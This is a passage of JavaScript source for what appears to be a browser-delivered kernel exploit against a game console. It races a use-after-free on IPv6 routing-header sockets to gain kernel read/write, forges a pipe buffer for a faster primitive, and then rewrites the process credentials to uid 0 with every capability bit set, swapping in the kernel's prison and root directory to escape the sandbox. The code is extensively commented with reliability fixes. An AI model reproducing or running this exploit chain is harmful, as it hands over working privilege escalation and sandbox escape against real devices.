                ? itasks.filter(t => t && !t.settled).length
                : iovWorkers.length;
            /*
            DRAIN FIRST, THEN WAKE. This is the shared release path used by
            landUio/landFakeUio/unwind as well as the race, and it writes
            unconditionally -- the same shape that can fill the send buffer and
            park sc(write). The bounded char is the fix, not the count: `wake`
            is already derived, but it can exceed what the buffer will take.
            */
            conserveWakes();
            wakeRacers(wake);
            /*
            BOUNDED. This is the shared release path, so an unbounded join here
            hangs every caller that fires a racer -- the race tail, unwind, and
            every refind. `wake` bytes went out, but a byte can still miss its
            racer (that is the drift this file documents), and the racer that
            missed it never settles.
            */
            await scheduleJoin(itasks, UNPARK_MS);
            let drained = 0;
            for (let k = 0; k < wake; ++k) {
                if (sc(SYS.read, iovSs[0], scratch, 1).i32 <= 0) break;
                drained++;
            }
            if (wake !== iovWorkers.length || drained !== wake)
                trace("RELEASE-IOV", "wake=" + wake + "/" + iovWorkers.length
                    + " drained=" + drained + "/" + wake
                    + " tagged=" + (tagged ? 1 : 0));
        }

        /*
        ITEM 3. tripletsUsable() only checks the three fds are non-zero and
        in the pool -- it never reads a single one back. Every getRthdr in
        the race path targets the MASTER only, so a slave that is no longer
        aliased is indistinguishable from one that is, and we then spend a
        full UAF re-roll on it. 14 of 28 cut-off runs die at or after a
        refind. poops.js:9381-9445 validates all three independently before
        trusting them; this is that check.
        */
        function tripletsAgree(why) {
            if (!tripletsUsable()) return false;
            const tags = [];
            for (const fd of triplets) {
                /*
                freshRthdr, not getRthdr. THIS IS THE VALIDATOR refindPair
                TRUSTS: it is the gate that decides whether three sockets are
                still aliasing the same chunk before every kread/kwrite. A
                stale read here does not merely mis-report -- it CONFIRMS
                agreement between three tags that came from earlier calls, so
                all three compare equal and the function returns true for a
                triplet it never actually read. The >= 0 test below could not
                catch that, because getRthdr leaves leakDv untouched on a
                short copyout.
                */
                const fr = freshRthdr(fd, UCRED_SIZE, 8);
                if (!fr.ok) {
                    const det = `${why} fd=${fd} ${fr.why}(got=${fr.got})`;
                    trace("TRIPLET-VALIDATE", det);
                    return false;
                }
                const v = leakDv.getUint32(4, true) >>> 0;
                if ((v & 0xffff0000) >>> 0 !== RTHDR_TAG) {
                    trace("TRIPLET-VALIDATE", why + " fd=" + fd + " untagged="
                        + hx(v));
                    return false;
                }
                tags.push(v);
            }

            /*
            All three must be reading the SAME chunk, i.e. the same tag.
            */
            const agree = tags[0] === tags[1] && tags[1] === tags[2];
            if (!agree)
                trace("TRIPLET-VALIDATE", why + " disagree "
                    + tags.map(hx).join(","));
            return agree;
        }

        function refindPair(tag) {
            return (async function () {
            for (let retry = 0; retry < 3; ++retry) {
                triplets[1] = await findTriplet(triplets[0], -1, tag + "1",
                    FIND_TRIPLET_FAST);
                triplets[2] = await findTriplet(triplets[0], triplets[1], tag + "2",
                    FIND_TRIPLET_FAST);
                if (tripletsUsable() && tripletsAgree(tag)) return true;
                sc(SYS.sched_yield);
            }
            mark("REFIND-UNVALIDATED", "tag=" + tag
                + " triplets=" + triplets.join(","));
            return false;
            })();
        }
        async function refindTriplets(itasks) {
            await releaseIov(itasks);
            /*
            refindPair is async (findTriplet yields) -- a bare call hands back
            a PROMISE, which is always truthy, so this used to report success
            unconditionally and every kread/kwrite kept racing on dead
            triplets. Await it.
            */
            if (await refindPair("RE")) return true;
            mark("TRIPLETS-LOST", "triplets=" + triplets.join(","));
            return false;
        }

        async function unwind(utasks, itasks, why, wakeUio, size, drainReads) {
            mark("KREAD-UNWIND", "why=" + why + " wake_uio=" + (wakeUio ? 1 : 0));
            try {
                if (wakeUio && utasks && utasks[0]) {

                    /*
                    THE ONLY UNBOUNDED BLOCK IN THIS FILE, now bounded.
                    uioSs is a blocking AF_UNIX socketpair -- no O_NONBLOCK,
                    no SO_RCVTIMEO -- and sc() is a synchronous syscall on the
                    main JS thread, so one read past the available bytes parks
                    the WebProcess forever and the console has to be pulled.

                    This is only reached when landUio EXHAUSTED its rounds,
                    and every round ends with await Promise.all(tasks), so no
                    racer is parked and there is nothing to wake. What is left
                    is exactly the re-prefill: `size` bytes on the read side
                    (landUio re-primes at its round tail) and NOTHING on the
                    write side (forWrite skips that prime, and its racers are
                    readv()-ers). So: one read, or none. Never N+1.
                    The old code asked for (N+1)*8 and hung just as hard --
                    it only ever survived because this path is rare.
                    */
                    const dsz = size || 8;
                    for (let k = 0; k < (drainReads || 0); ++k) {
                        await breathe();
                        sc(SYS.read, uioSs[0], scratch, dsz);
                    }
                    /*
                    BOUNDED. unwind is the ERROR path -- it runs precisely when
                    landUio or landFakeUio already failed to park its racers,
                    so the set most likely to contain a wedged worker is the
                    one whose join had no deadline. Hanging in the handler for
                    a hang is the worst possible place for it.
                    */
                    await scheduleJoin(utasks, UNPARK_MS);
                }
            } catch (e) { mark("UNWIND-UIO-THREW", e.message); }
            try {
                if (itasks && itasks[0]) await releaseIov(itasks);
            } catch (e) { mark("UNWIND-IOV-THREW", e.message); }
            restoreRefcntIov();
            /* Same as above: refindPair is async, its Promise is truthy. */
            const ok = await refindPair("UW");
            mark("KREAD-UNWOUND", "triplets=" + triplets.join(",")
                + " usable=" + ok);
            return ok;
        }

        /*
        `pairs` (optional) = [{addr,size},...] gathered into ONE forged uio.
        `size` must be the sum. iovAb is 0x170 = [uio 0x30][20 iovec slots],
        uio_iovcnt is already NUM_UIO_IOV (0x14), and fakeUio zero-fills, so
        slots 1..19 are in-bounds and inert unless populated here.
        ITEM 2. Refuse to spend a slow op on an address that cannot be a
        kernel pointer. Without this, a kread that returned all zeros gave
        int64(0,0) -- which is TRUTHY -- so the walk carried on and issued a
        read at ~0x270 through a UIO_SYSSPACE uio inside writev: a near-NULL
        kernel dereference. poops.js:4800-4807 gates the same way.
        */
        /*
        Aliases of module/addr.js, matching the names used throughout this
        file. lapse.js does the same at its own call sites.

        `same` MUST live here at function scope, not inside the make_karw
        block: remove_uaf_file's short-read fallback (the fd-table chunk scan)
        also calls it, and that code is outside the karw block. When the dedup
        moved it to `const same = sameI64` beside the kv forge it fell out of
        scope there, every short read threw a ReferenceError, and the repair
        was skipped -- which is the dangling struct file behind the panics.
        */
        const kaddrOk = isKernelPtrAligned;
        const same = sameI64;

        async function kreadSlow(addr, size, pairs) {
            if (kreadPoisoned) { mark("KREAD-REFUSED", "reason=poisoned"); return null; }
            if (pairs) {
                for (const q of pairs) if (!kaddrOk(q.addr)) {
                    mark("KREAD-REFUSED", "bad-pair-addr=" + q.addr);
                    return null;
                }
            } else if (!kaddrOk(addr)) {
                mark("KREAD-REFUSED", "bad-addr=" + addr);
                return null;
            }
            if (!tripletsUsable()) {
                mark("KREAD-REFUSED", "triplets="
                    + triplets.join(",")); return null;
            }
            if (pairs && pairs.length > NUM_UIO_IOV) {
                mark("KREAD-REFUSED", "pairs=" + pairs.length + " > " + NUM_UIO_IOV);
                return null;
            }
            mark("KREAD-BEGIN", "addr=" + (pairs
                ? pairs.map(p2 => "" + p2.addr).join("+") : addr) + " size=" + size);
            const bufs = uioWorkers.map(function () {
                const ab = new ArrayBuffer(size); keepAlive.push(ab);

                /*
                ITEM 2. Sentinel-fill so an EMPTY read is distinguishable
                from a real read of a zero qword. A fresh buffer is all
                zeros, which used to sail through the hit test below and
                return int64(0,0) as if it were kernel data.
                */
                new Uint8Array(ab).fill(0x41);
                return { ab: ab, addr: bufAddr(ab), dv: new DataView(ab) };
            });
            lenDv.setUint32(0, size, true);
            sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
            sc(SYS.write, uioSs[1], scratch, size);
            put(uioIovDv, 8, size);
            const utasks = new Array(uioWorkers.length);
            const uioIov = await landUio(size, false, utasks);
            if (!uioIov) {
                /*
                landUio just spent its WHOLE budget (30 s / 10 000 rounds) and
                did not land. That is not a transient miss a retry can fix --
                the chunk is not coming back through this path -- so poison
                here too. Without this, kread8/kreadN/kreadPairs each burn
                KREAD_TRIES x 30 s more of spraying before anything gives up,
                which is the endless UIO-LAND-ROUND stream.
                */
                kreadPoisoned = true;
                mark("UIO-LAND-EXHAUSTED", "size=" + size + " -- poisoning kreads");
                await unwind(utasks, null, "no-uio", true, size, 1);
                return null;
            }
            trace("UIO-LANDED", "uio_iov=" + uioIov);
            fakeUio(uioIov, size, UIO_WRITE);
            if (pairs) {
                for (let i = 0; i < pairs.length; ++i) {
                    put(iovDv, 0x30 + IOVEC_SIZE * i, pairs[i].addr);
                    put(iovDv, 0x38 + IOVEC_SIZE * i, pairs[i].size);
                }
            } else {
                put(iovDv, 0x30, addr);
                put(iovDv, 0x38, size);
            }
            const itasks = new Array(iovWorkers.length);
            const ok = await landFakeUio(itasks);
            if (!ok) {
                kreadPoisoned = true;
                await unwind(utasks, itasks, "no-fake-uio", false, size);
                return null;
            }
            trace("KREAD-WAKE", "src=" + addr);

            sc(SYS.read, uioSs[0], scratch, size);
            let got = null, drained = 0;
            for (const b of bufs) {
                sc(SYS.read, uioSs[0], b.addr, size);
                drained++;
                if (!got
                    && !(b.dv.getUint32(0, true) === 0x41414141
                        && b.dv.getUint32(4, true) === 0x41414141)) got = b.dv;
            }
            trace("KREAD-DRAINED", "bufs=" + drained + "/" + bufs.length
                + " hit=" + (got ? 1 : 0));
            /*
            BOUNDED. utasks are readv/writev racers fired at timeoutMs 0; a
            bare Promise.all here hangs kreadSlow -- and every kread in the
            make_karw block goes through it -- on a racer that parked without
            returning. That is the same "no finally, no summary" freeze the
            pre-refcount reclaim had.
            */
            await scheduleJoin(utasks, UNPARK_MS);
            trace("KREAD-UIO-JOINED", "");
            restoreRefcntIov();
            await refindTriplets(itasks);
            return got;
        }

        async function kwriteSlow(dst, srcAddr, size) {
            if (kreadPoisoned) { mark("KWRITE-REFUSED", "reason=poisoned"); return false; }
            if (!kaddrOk(dst)) { mark("KWRITE-REFUSED", "bad-dst=" + dst); return false; }
            if (!tripletsUsable()) {
                mark("KWRITE-REFUSED", "triplets="
                    + triplets.join(",")); return false;
            }
            mark("KWRITE-BEGIN", "dst=" + dst + " size=" + size);
            lenDv.setUint32(0, size, true);
            sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
            put(uioIovDv, 8, size);
            const utasks = new Array(uioWorkers.length);
            const uioIov = await landUio(size, true, utasks);
            if (!uioIov) {
                /* Same as kreadSlow: a full-budget miss poisons, not retries. */
                kreadPoisoned = true;
                mark("UIO-LAND-EXHAUSTED", "size=" + size + " -- poisoning kwrites");
                await unwind(utasks, null, "no-uio", true, size, 0);
                return false;
            }
            fakeUio(uioIov, size, UIO_READ);
            put(iovDv, 0x30, dst);
            put(iovDv, 0x38, size);
            const itasks = new Array(iovWorkers.length);
            const ok = await landFakeUio(itasks);
            if (!ok) {
                kreadPoisoned = true;
                await unwind(utasks, itasks, "no-fake-uio", false, size);
                return false;
            }
            for (let k = 0; k < uioWorkers.length; ++k)
                sc(SYS.write, uioSs[1], srcAddr, size);
            /* BOUNDED -- see kreadSlow. */
            await scheduleJoin(utasks, UNPARK_MS);
            restoreRefcntIov();
            await refindTriplets(itasks);
            return true;
        }

        /*
        R1. This read proves nothing the pipe primitive does not prove better,
        and it is slow op #1 of 7 -- one full UAF re-roll at ~3.1% death for a
        check that is repeated at :kernelview-reads-kernel-elf-header on the
        FAST primitive, before the first kernel write. poops.js:8672 runs its
        ELF proof on kread64Fast for exactly this reason, and poops.js:6063
        records deleting the equivalent slow read. `kernelBase` is still
        required below, so the gate on it stays.
        */
        const R1_ON = params.get("r1") !== "0";
        if (!R1_ON && kernelBase && triplets) {
            state("kread_slow...", "warn");
            const got = await kreadSlow(kernelBase, 0x20);
            if (got) {
                const b = [];
                for (let i = 0; i < 16; ++i) b.push(got.getUint8(i));
                mark("KREAD", "kernel_base -> " + hexBytes(b));
                check("kread_slow-reads-kernel-elf-header",
                    got.getUint32(0, true) === 0x464c457f,
                    "e_type=" + got.getUint16(0x10, true)
                    + " e_machine=" + hx(got.getUint16(0x12, true)));
            } else check("kread_slow-returned-data", false, "");
        }

        let kv = null;
        /*
        THE GATE EVERY REJECTION ABOVE HAS TO PASS THROUGH.

        `kqFdp` being truthy is NOT evidence that it was read. It is an int64
        (a 0xee-filled one is still an object), so `&& kqFdp` accepted a
        sentinel-filled field and let make_karw run a full walk against
        0xeeee... -- which is the run this was found on: KQUEUE-LEAK-REFUSED
        fired correctly, triplets[2] was zeroed correctly, and the stage ran
        anyway because the gate only asked `triplets` (a 3-array, still
        truthy with a 0 inside) and `kqFdp` (an object).

        Ask the three questions that actually matter: the triplets are all
        usable, the kq_fdp word is a real kernel pointer, and it is not the
        R2 sentinel. Any of those false and the earlier stages have already
        said why -- this only has to refuse to proceed.
        */
        const karwGate = kernelBase && tripletsUsable()
            && isKernelPtrAligned(kqFdp)
            && !((kqFdp.low >>> 0) === 0xeeee && (kqFdp.hi >>> 0) === 0xeeee);
        if (!karwGate && kernelBase) {
            mark("MAKE-KARW-BLOCKED", "kernel_base=" + kernelBase
                + " triplets=" + (triplets ? triplets.join(",") : "none")
                + " kq_fdp=" + (kqFdp || "null")
                + " usable=" + (triplets ? tripletsUsable() : false)
                + " -- an earlier stage rejected these; not walking");
        }
        if (karwGate) {
            state("make_karw...", "warn");
            mark("SHORT-READS", "n=" + shortReads + " gate=" + (R2_ON ? 1 : 0));

            const KREAD_TRIES = params.has("kreadtries")
                ? parseInt(params.get("kreadtries"), 10) : 4;
            async function kread8(a) {
                for (let t = 0; t < KREAD_TRIES; ++t) {
                    if (t) mark("KREAD-RETRY", "addr=" + a + " try=" + (t + 1));
                    const dv = await kreadSlow(a, 8);
                    if (dv) return new int64(dv.getUint32(0, true),
                        dv.getUint32(4, true));
                    if (kreadPoisoned || !tripletsUsable()) break;
                }
                return null;
            }
            async function kwrite8n(dst, srcAddr, n) {
                for (let t = 0; t < KREAD_TRIES; ++t) {
                    if (t) mark("KWRITE-RETRY", "dst=" + dst + " try=" + (t + 1));
                    if (await kwriteSlow(dst, srcAddr, n)) return true;
                    if (kreadPoisoned || !tripletsUsable()) break;
                }
                return false;
            }


            // R3/R4 helpers. Same retry discipline as kread8 -- do NOT drop it.
            const qw = (dv, o) => new int64(dv.getUint32(o, true),
                dv.getUint32(o + 4, true));
            async function kreadN(a, n) {
                for (let t = 0; t < KREAD_TRIES; ++t) {
                    if (t) mark("KREAD-RETRY", "addr=" + a + " n=" + n
                        + " try=" + (t + 1));
                    const dv = await kreadSlow(a, n);
                    if (dv) return dv;
                    if (kreadPoisoned || !tripletsUsable()) break;
                }
                return null;
            }

            /*
            R4. One window, two non-adjacent addresses, via extra iovec slots
            in the forged uio. poops.js:4909-4930 buildUioPairs / :4947-5010.
            */
            async function kreadPairs(pairs) {
                let total = 0;
                for (const p2 of pairs) total += p2.size;
                for (let t = 0; t < KREAD_TRIES; ++t) {
                    if (t) mark("KREAD-RETRY", "pairs=" + pairs.length
                        + " try=" + (t + 1));
                    const dv = await kreadSlow(null, total, pairs);
                    if (dv) return dv;
                    if (kreadPoisoned || !tripletsUsable()) break;
                }
                return null;
            }
            const R3_ON = params.get("r3") !== "0";
            const R4_ON = params.get("r4") !== "0";

            const fdtOfiles = await kread8(kqFdp);
            mark("FDT-OFILES", "" + fdtOfiles);

            /*
            R3. mFp and sFp are FILEDESCENT_SIZE apart in one live ofiles
            span, so one 0x20 read replaces two windows. pipe() at :387/:389
            are back-to-back with no intervening fd allocation, so the two
            low fds are always 2 apart -- 44/44 in the log. Verified, not
            assumed, and it falls back if the console ever disagrees.
            */
            let mFp = null, sFp = null;
            const fdDelta = slavePipe[0] - masterPipe[0];
            const spanOk = R3_ON && fdtOfiles && fdDelta > 0
                && (fdDelta + 1) * FILEDESCENT_SIZE <= 0x20;
            if (spanOk) {
                const span = await kreadN(
                    fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE), 0x20);
                if (span) {
                    mFp = qw(span, 0);
                    sFp = qw(span, fdDelta * FILEDESCENT_SIZE);
                } else mark("PIPE-FP-SPAN-MISS", "delta=" + fdDelta);
            }
            if (!mFp && fdtOfiles && !kreadPoisoned && tripletsUsable()) {
                if (spanOk) mark("PIPE-FP-FALLBACK", "two single reads");
                mFp = await kread8(
                    fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE));
                sFp = await kread8(
                    fdtOfiles.add32(slavePipe[0] * FILEDESCENT_SIZE));
            }
            mark("PIPE-FP", "master=" + (mFp || "?") + " slave=" + (sFp || "?")
                + " delta=" + fdDelta + " span=" + (spanOk ? 1 : 0));

            /*
            R4. f_data of the two struct files: unrelated addresses, so a
            contiguous read cannot help -- this needs the scatter.
            */
            let mData = null, sData = null;
            if (R4_ON && mFp && sFp) {
                const both = await kreadPairs([{ addr: mFp, size: 8 },
                { addr: sFp, size: 8 }]);
                if (both) { mData = qw(both, 0); sData = qw(both, 8); }
                else mark("PIPE-FDATA-SCATTER-MISS", "");
            }
            if (!mData && !kreadPoisoned && tripletsUsable()) {
                if (R4_ON && mFp && sFp) mark("PIPE-FDATA-FALLBACK", "two reads");
                mData = mFp ? await kread8(mFp) : null;
                sData = sFp ? await kread8(sFp) : null;
            }
            mark("PIPE-FDATA", "master=" + (mData || "?") + " slave=" + (sData || "?"));
            const kptr = isKernelPtr;

            /*
            R8. Two distinct struct files cannot share f_data. Equal values
            mean the alias was misidentified, and aiming a pipebuf at itself
            is not something that fails cleanly. POOPS.LUA:1068 aborts here.
            */
            if (kptr(mData) && kptr(sData)
                && mData.low === sData.low && mData.hi === sData.hi) {
                check("pipe-fdata-distinct", false, "both=" + mData);
                mark("MAKE-KARW-ABORTED", "reason=mdata-equals-sdata");
                mData = null;
            }
            if (!check("ofiles-walk-reached-pipes",
                kptr(fdtOfiles) && kptr(mFp) && kptr(sFp)
                && kptr(mData) && kptr(sData), "")) {
                mark("MAKE-KARW-ABORTED", "reason=walk-not-kernel-pointers");
            } else {

                const pbAb = new ArrayBuffer(PIPEBUF_SIZEOF);
                keepAlive.push(pbAb);
                const pbAddr = bufAddr(pbAb), pbDv = new DataView(pbAb);
                new Uint8Array(pbAb).fill(0);
                pbDv.setUint32(0x0c, PIPE_PAGE, true);
                put(pbDv, 0x10, sData);
                mark("PIPEBUF-AIM", "at=" + mData + " size=0x"
                    + PIPE_PAGE.toString(16) + " buffer=" + sData);
                const wrote = await kwrite8n(mData, pbAddr, PIPEBUF_SIZEOF);
                check("pipebuf-written-master-struct-pipe", wrote, "");

                if (wrote) {
                    for (const fd of [masterPipe[0], masterPipe[1],
                    slavePipe[0], slavePipe[1]])
                        sc(SYS.fcntl, fd, F_SETFL, O_NONBLOCK);
                    const kvBufAb = new ArrayBuffer(PIPEBUF_SIZEOF);
                    const kvViewAb = new ArrayBuffer(0x40);
                    keepAlive.push(kvBufAb, kvViewAb);
                    const kvBufAddr = bufAddr(kvBufAb), kvBufDv = new DataView(kvBufAb);
                    const kvViewAddr = bufAddr(kvViewAb), kvViewDv = new DataView(kvViewAb);
                    new Uint8Array(kvBufAb).fill(0);
                    kvBufDv.setUint32(0x0c, PIPE_PAGE, true);
                    kv = {
                        flush: function () {
                            sc(SYS.write, masterPipe[1], kvBufAddr, PIPEBUF_SIZEOF);
                            sc(SYS.read, masterPipe[0], kvBufAddr, PIPEBUF_SIZEOF);
                        },
                        kread: function (dst, src, n) {
                            put(kvBufDv, 0x10, src);
                            kvBufDv.setUint32(0, n >>> 0, true);
                            this.flush();
                            return sc(SYS.read, slavePipe[0], dst, n).i32;
                        },
                        kwrite: function (dst, src, n) {
                            put(kvBufDv, 0x10, dst);
                            kvBufDv.setUint32(0, n >>> 0, true);
                            this.flush();
                            return sc(SYS.write, slavePipe[1], src, n).i32;
                        },
                        read8: function (a) {
                            new Uint8Array(kvViewAb).fill(0);
                            this.kread(kvViewAddr, a, 8);
                            return new int64(kvViewDv.getUint32(0, true),
                                kvViewDv.getUint32(4, true));
                        },
                    };
                    mark("KERNELVIEW", "master=" + masterPipe + " slave=" + slavePipe);

                    new Uint8Array(kvViewAb).fill(0);
                    kv.kread(kvViewAddr, kernelBase, 0x10);
                    const hdr = [];
                    for (let i = 0; i < 16; ++i) hdr.push(kvViewDv.getUint8(i));
                    mark("KV-READ", "kernel_base -> " + hexBytes(hdr));
                    const kvElfOk = check("kernelview-reads-kernel-elf-header",
                        kvViewDv.getUint32(0, true) === 0x464c457f, "");

                    const fpM2 = kv.read8(fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE));
                    const fpS2 = kv.read8(fdtOfiles.add32(slavePipe[0] * FILEDESCENT_SIZE));
                    mark("KV-FGET", "master=" + fpM2 + " kread=" + mFp
                        + " slave=" + fpS2 + " kread=" + sFp);
                    const kvAgree = check("primitives-agree-pipes-struct-file",
                        same(fpM2, mFp) && same(fpS2, sFp), "");
                    if (!kvElfOk || !kvAgree) {

                        /*
                        REPORT ONLY. Do NOT null kv and do NOT skip what
                        follows. By this point the pipebuf forge has already
                        been committed, and the code below -- nulling the
                        triplets' ip6po_rthdr and removing the aliased struct
                        file -- is exactly what lets the process exit without
                        panicking the kernel. Gating it on a failed view
                        turns a run that would have finished dirty-but-alive
                        into a guaranteed panic at exit. Four independent
                        reviewers caught this; it was my mistake.
                        */
                        mark("KERNELVIEW-SUSPECT", "elf=" + (kvElfOk ? 1 : 0)
                            + " agree=" + (kvAgree ? 1 : 0)
                            + " -- repair still runs, later stages self-gate");
                    }

                    const kvwAb = new ArrayBuffer(0x10); keepAlive.push(kvwAb);
                    const kvwAddr = bufAddr(kvwAb), kvwDv = new DataView(kvwAb);

                    /*
                    dump scratch: kvwAb is only 0x10, and the pipebuf read
                    needs 0x18. Separate buffers so the dump can never
                    overflow the one the kview accessors use.
                    */
                    const dmpAb = new ArrayBuffer(0x20); keepAlive.push(dmpAb);
                    const dmpAddr = bufAddr(dmpAb), dmpDv = new DataView(dmpAb);
                    const dmpU8 = new Uint8Array(dmpAb);
                    const scanAbDump = new ArrayBuffer(0x80 * FILEDESCENT_SIZE);
                    keepAlive.push(scanAbDump);
                    const scanAddrDump = bufAddr(scanAbDump);
                    const scanDvDump = new DataView(scanAbDump);
                    function kview(base) {
                        return {
                            getBInt: function (o) {
                                return kv.read8(base.add32(o));
                            },
                            setBInt: function (o, v) {
                                new Uint8Array(kvwAb).fill(0);
                                put(kvwDv, 0, v);
                                kv.kwrite(base.add32(o), kvwAddr, 8);
                            },
                            getInt32: function (o) {
                                new Uint8Array(kvwAb).fill(0);
                                kv.kread(kvwAddr, base.add32(o), 4);
                                return kvwDv.getInt32(0, true);
                            },
                            setInt32: function (o, v) {
                                new Uint8Array(kvwAb).fill(0);
                                kvwDv.setInt32(0, v, true);
                                kv.kwrite(base.add32(o), kvwAddr, 4);
                            },
                            setUint8: function (o, v) {
                                new Uint8Array(kvwAb).fill(0);
                                kvwDv.setUint8(0, v);
                                kv.kwrite(base.add32(o), kvwAddr, 1);
                            },
                        };
                    }
                    const kptr2 = isKernelPtr;
                    const fget = fd => kv.read8(
                        fdtOfiles.add32(fd * FILEDESCENT_SIZE));
                    function fput(fd, v) {
                        new Uint8Array(kvwAb).fill(0);
                        put(kvwDv, 0, v);
                        kv.kwrite(fdtOfiles.add32(fd * FILEDESCENT_SIZE), kvwAddr, 8);
                    }

                    /*
                    WATCHDOG. Each bump is a kread+kwrite (4 pipe syscalls),
                    and this is called once per pipe fd -- 4 fds in the refcnt
                    block. Up to 4 x 4 x 4 = 64 kernel ops in a row with no
                    yield. ASYNC now: the two call sites await it.
                    */
                    async function fhold(fp) {
                        const before = kview(fp).getInt32(0x28);
                        if (before <= 0 || before > 0xffff) return { before, after: before };
                        let after = before;
                        for (let bump = 1; bump <= 4; ++bump) {
                            await breathe();
                            kview(fp).setInt32(0x28, before + bump);
                            after = kview(fp).getInt32(0x28);
                            if (after > before && after >= 2) break;
                        }
                        return { before, after };
                    }
                    {
                        const held = [];
                        let allOk = true;
                        for (const fd of [masterPipe[0], masterPipe[1],
                        slavePipe[0], slavePipe[1]]) {
                            const fp = fget(fd);
                            if (!kptr2(fp)) { allOk = false; held.push(fd + ":badfp"); continue; }
                            const r = await fhold(fp);
                            if (!(r.after > r.before)) allOk = false;
                            held.push(fd + ":" + r.before + "->" + r.after);
                        }
                        mark("PIPE-REFCNT", held.join(" "));
                        check("four-karw-pipe-files-hold",
                            allOk, "");
                    }

                    /*
                    ITEM 1. Jailbreak BEFORE the teardown. The funnel was
                    KERNELVIEW 44 -> CURPROC 38: six runs had working
                    kernel R/W and died in cleanup without ever trying.
                    Everything below needs only kv, fdtOfiles and sc, all
                    live from here. poops.js:7273 orders it the same way.

                    WRAPPED, and it has to be: running before the cleanup
                    means a throw in here would skip the socket close and
                    the alias repair and leave the console dirty. Running
                    last, it never could.
                    */
                    let jailbreakThrew = null;

                    /*
                    Declared OUT here: the kernel patcher and the
                    payload stage read both, and a let inside the try
                    below would be block-scoped away from them --
                    a runtime ReferenceError node --check cannot see.
                    */
                    let jailbroken = false, curproc = null;
                    try {
                        const FIOSETOWN = 0x8004667c;
                        const P_LIST_NEXT = 0x00, P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
                        const CR_UID = 0x04, CR_RUID = 0x08, CR_SVUID = 0x0c;
                        const CR_NGROUPS = 0x10, CR_RGID = 0x14;
                        const CR_PRISON = 0x30, CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
                        const FD_RDIR = 0x10, FD_JDIR = 0x18;
                        state("sandbox escape...", "warn");
                        {
                            if (sc(SYS.pipe, argAddr).i32 !== -1) {
                                const escPipe = [argDv.getInt32(0, true),
                                argDv.getInt32(4, true)];
                                lenDv.setUint32(0, pid, true);
                                sc(SYS.ioctl, escPipe[0], FIOSETOWN, lenAddr);
                                const escFp = fget(escPipe[0]);
                                const escData = kptr2(escFp) ? kv.read8(escFp) : null;
                                const sigio = kptr2(escData)
                                    ? kv.read8(escData.add32(0xd0)) : null;
                                curproc = kptr2(sigio) ? kv.read8(sigio) : null;
                                sc(SYS.close, escPipe[1]);
                                sc(SYS.close, escPipe[0]);
                            }
                            mark("CURPROC", "" + (curproc || "null"));
                            check("curproc-resolved-through-pipe-sigio",
                                kptr2(curproc), "" + (curproc || "null"));
                        }
                        if (kptr2(curproc)) {

                            /*
                            WATCHDOG. Up to 4096 iterations, each one a kernel
                            read via kview(q).getInt32 -- two pipe syscalls
                            apiece. It exits early when it finds the target, but
                            the BOUND is 4096, and on a console where pid 0 sits
                            late in the allproc list that is a very long
                            unbroken stretch. ASYNC now: the call site awaits.
                            */
                            async function pfind(target) {
                                let q = kv.read8(curproc);
                                for (let n = 0; n < 4096; ++n) {
                                    await breathe();
                                    if (!kptr2(q)) return null;
                                    if (kview(q).getInt32(P_PID) === target) return q;
                                    q = kv.read8(q.add32(P_LIST_NEXT));
                                }
                                return null;
                            }
                            const kProc = await pfind(0);
                            const procFd = kv.read8(curproc.add32(P_FD));
                            const ucred = kv.read8(curproc.add32(P_UCRED));
                            mark("JAILBREAK-SOURCES", "kproc=" + (kProc || "null")
                                + " p_fd=" + procFd + " p_ucred=" + ucred);
                            const prison0 = kptr2(kProc)
                                ? kv.read8(kv.read8(kProc.add32(P_UCRED)).add32(CR_PRISON))
                                : null;
                            const rootVnode = kptr2(kProc)
                                ? kv.read8(kv.read8(kProc.add32(P_FD)).add32(FD_RDIR))
                                : null;
                            const srcOk = kptr2(procFd) && kptr2(ucred)
                                && kptr2(prison0) && kptr2(rootVnode);
                            mark("JAILBREAK-KSRC", "prison0=" + (prison0 || "null")
                                + " rootvnode=" + (rootVnode || "null"));
                            if (check("jailbreak-source-kernel-pointer",
                                srcOk, srcOk ? "" : "refusing to write")) {
                                kview(ucred).setInt32(CR_UID, 0);
                                kview(ucred).setInt32(CR_RUID, 0);
                                kview(ucred).setInt32(CR_SVUID, 0);
                                kview(ucred).setInt32(CR_NGROUPS, 1);
                                kview(ucred).setInt32(CR_RGID, 0);
                                kview(ucred).setBInt(CR_PRISON, prison0);
                                kview(ucred).setBInt(CR_SCECAPS1, new int64(-1, -1));
                                kview(ucred).setBInt(CR_SCECAPS0, new int64(-1, -1));
                                kview(procFd).setBInt(FD_RDIR, rootVnode);
                                kview(procFd).setBInt(FD_JDIR, rootVnode);
                                const uidNow = sc(SYS.getuid).i32;
                                jailbroken = uidNow === 0;
                                mark("JAILBROKEN", "uid=" + uidNow
                                    + " prison0=" + kview(ucred).getBInt(CR_PRISON)
                                    + " fd_rdir=" + kview(procFd).getBInt(FD_RDIR));
                                check("kernel-reports-root",
                                    jailbroken, "getuid=" + uidNow);
                            }
                        }
                    } catch (e) {
                        jailbreakThrew = e && e.message ? e.message : "" + e;
                        mark("JAILBREAK-THREW", jailbreakThrew
                            + " -- continuing to cleanup");
                    }

                    /*
                    Addresses captured during the repair so the end-of-run
                    dump can re-read them once the sockets are closed.
                    */
                    const dumpOpts = [];
                    function removeRthdrFromSocket(fd) {
                        const fp = fget(fd);
                        if (!kptr2(fp)) return "badfp";
                        const fData = kv.read8(fp);
                        if (!kptr2(fData)) return "badfdata";
                        const soPcb = kv.read8(fData.add32(0x18));
                        if (!kptr2(soPcb)) return "badpcb";
                        const opts = kv.read8(soPcb.add32(0x118));
                        if (kptr2(opts)) dumpOpts.push({ fd: fd, opts: opts });
                        if (!kptr2(opts)) return "noopts";

                        /*
                        ITEM 4. Read it, write it, READ IT BACK. This is the
                        single write that decides whether the process can exit
                        without panicking, and until now nothing anywhere in
                        the chain has ever confirmed that a kv write actually
                        lands -- the check below reported "nulled" purely
                        because the four reads above looked pointer-shaped.
                        poops.js:7123-7128 reads back the same way.
                        */
                        const was = kview(opts).getBInt(0x68);
                        kview(opts).setBInt(0x68, new int64(0, 0));
                        const now = kview(opts).getBInt(0x68);
